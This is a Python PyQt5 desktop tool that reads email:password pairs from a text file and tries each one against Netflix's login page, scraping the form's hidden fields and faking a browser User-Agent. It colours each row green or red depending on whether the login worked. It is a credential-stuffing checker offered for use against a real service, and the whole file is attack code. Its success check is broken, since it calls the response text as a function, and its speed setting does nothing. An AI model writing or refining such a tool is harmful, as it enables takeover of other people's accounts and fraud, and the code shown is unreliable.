import sys
import re
from PyQt5.QtWidgets import QApplication, QWidget, QGridLayout, QLabel, QLineEdit, QPushButton, QFileDialog, QTableWidget, QTableWidgetItem, QComboBox
from PyQt5.QtGui import QFont, QColor
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from time import sleep
from bs4 import BeautifulSoup
import requests


class LoginThread(QThread):
    result = pyqtSignal(dict)

    def __init__(self, email, password, credentials, speed):
        super().__init__()
        self.email = email
        self.password = password
        self.credentials = credentials
        self.speed = speed

    def run(self):
        session = requests.Session()

        for credential in self.credentials:
            email, password = credential

            # Step 1: Send a GET request to the login page
            login_url = 'https://www.netflix.com/login'
            response = session.get(login_url)

            if response.status_code == 200:
                # Step 2: Extract the necessary values from the login page
                soup = BeautifulSoup(response.text, 'html.parser')
                flow_value = soup.find('input', {'name': 'flow'}).get('value')
                mode_value = soup.find('input', {'name': 'mode'}).get('value')
                action_value = soup.find('input', {'name': 'action'}).get('value')
                authURL_value = soup.find('input', {'name': 'authURL'}).get('value')
                nextPage_value = soup.find('input', {'name': 'nextPage'}).get('value')

                # Step 3: Send a POST request to perform the login
                payload = {
                    'userLoginId': email,
                    'password': password,
                    'rememberMeCheckbox': 'true',
                    'flow': flow_value,
                    'mode': mode_value,
                    'action': action_value,
                    'authURL': authURL_value,
                    'nextPage': nextPage_value
                }
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Referer': login_url
                }
                response = session.post(login_url, data=payload, headers=headers)

                # Step 4: Check the login response
                if response.text("Welcome Back!"):
                    # Login successful
                    status = 'Success'
                else:
                    # Login failed
                    status = 'Failure'
            else:
                # Failed to access the login page
                status = 'Error'

            result = {'row': self.credentials.index(credential), 'status': status}
            self.result.emit(result)

        # Step 5: Close the session
        session.close()


class YourMainWindowClass(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Custom GUI")
        self.setStyleSheet("background-color: black;")
        self.resize(600, 400)

        layout = QGridLayout()

        self.table = QTableWidget()
        self.table.setColumnCount(3)
        self.table.setHorizontalHeaderLabels(["Email", "Password", "Status"])
        self.table.setStyleSheet("background-color: purple; color: white; border: none;")
        self.table.horizontalHeader().setStyleSheet("background-color: purple; color: white; border: none;")
        self.table.verticalHeader().setStyleSheet("background-color: purple; color: white; border: none;")

        self.email_input = QLineEdit()
        self.email_input.setStyleSheet("background-color: white; color: black; border: none;")
        self.password_input = QLineEdit()
        self.password_input.setStyleSheet("background-color: white; color: black; border: none;")
        self.file_button = QPushButton("Select File")
        self.file_button.setStyleSheet("background-color: green; color: white; border: none;")
        self.file_button.clicked.connect(self.select_file)
        self.login_button = QPushButton("Login")
        self.login_button.setStyleSheet("background-color: blue; color: white; border: none;")
        self.login_button.clicked.connect(self.login)
        self.speed_combo = QComboBox()
        self.speed_combo.addItem("Slow")
        self.speed_combo.addItem("Medium")
        self.speed_combo.addItem("Fast")

        layout.addWidget(self.table, 0, 0, 1, 4)
        layout.addWidget(QLabel("Email:"), 1, 0)
        layout.addWidget(self.email_input, 1, 1, 1, 3)
        layout.addWidget(QLabel("Password:"), 2, 0)
        layout.addWidget(self.password_input, 2, 1, 1, 3)
        layout.addWidget(self.file_button, 3, 0, 1, 2)
        layout.addWidget(self.login_button, 3, 2, 1, 1)
        layout.addWidget(QLabel("Speed:"), 3, 3)
        layout.addWidget(self.speed_combo, 3, 4)

        self.setLayout(layout)

        self.login_thread = None

    def select_file(self):
        file_dialog = QFileDialog()
        file_dialog.setFileMode(QFileDialog.ExistingFile)
        file_dialog.setNameFilter("Text files (*.txt)")
        if file_dialog.exec_():
            file_paths = file_dialog.selectedFiles()
            if file_paths:
                file_path = file_paths[0]
                self.credentials = self.read_credentials(file_path)

    def read_credentials(self, file_path):
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()
                credentials = []
                for line in lines:
                    line = line.strip()
                    if line:
                        email, password = line.split(":")
                        credentials.append((email, password))
                return credentials
        except Exception as e:
            print("Error reading credentials:", str(e))
            return []

    def login(self):
        email = self.email_input.text()
        password = self.password_input.text()

        if not hasattr(self, 'credentials'):
            print("No credentials found in the file")
            return

        if self.login_thread is not None and self.login_thread.isRunning():
            return

        speed = self.speed_combo.currentText()

        self.login_thread = LoginThread(email, password, self.credentials, speed)
        self.login_thread.result.connect(self.handle_login_result)
        self.login_thread.start()

    def handle_login_result(self, result):
        row = result['row']
        status = result['status']
        self.table.setItem(row, 2, QTableWidgetItem(status))
        if status == 'Success':
            self.table.item(row, 2).setBackground(QColor(0, 255, 0))
        else:
            self.table.item(row, 2).setBackground(QColor(255, 0, 0))


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = YourMainWindowClass()
    window.show()
    sys.exit(app.exec_())
